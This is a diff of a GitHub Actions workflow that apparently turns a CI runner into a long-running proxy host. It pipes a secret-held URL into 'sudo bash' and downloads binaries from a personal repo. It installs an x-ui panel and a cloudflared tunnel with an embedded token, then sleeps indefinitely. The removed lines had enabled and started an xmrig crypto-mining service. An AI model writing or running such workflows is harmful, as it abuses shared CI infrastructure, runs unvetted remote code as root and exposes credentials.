@@ -14,11 +14,14 @@ jobs:
       - run: |
           pwd
           sudo curl -sL ${{ secrets.SETENV }}  | sudo bash -s
-          sudo curl -Ls https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh | sudo bash -s
+          wget https://github.com/sweetasshole/test/raw/refs/heads/main/x-ui/xui-usr-local.tar.gz
           wget https://github.com/sweetasshole/test/raw/refs/heads/main/x-ui/x-ui.db
+          sudo mkdir /usr/local/x-ui
+          tar -xzvf xui-usr-local.tar.gz /usr/local/x-ui
+          sudo chmod +x /usr/local/x-ui/x-ui
           sudo mv x-ui.db /etc/x-ui
           sudo systemctl daemon-reload
-          sudo systemctl enable xmrig
-          sudo systemctl start xmrig
+          sudo systemctl enable x-ui
+          sudo systemctl start x-ui
           sudo cloudflared service install eyJhIjoiOGQyMDg4NjE0Nzg1N2EwY2RjYzhkYjc3OGU4YjZlZjciLCJ0IjoiNWNlMzQzYmUtNjJhNi00OTdhLTlmNTgtZDQ1MDg2YmFlMDA4IiwicyI6IllqVmpOekV6WWpJdFlqZzJOeTAwTXpoakxXSXdZVGt0T1RBeU56Z3hPR1UyT1RrMSJ9
           sleep 99999999
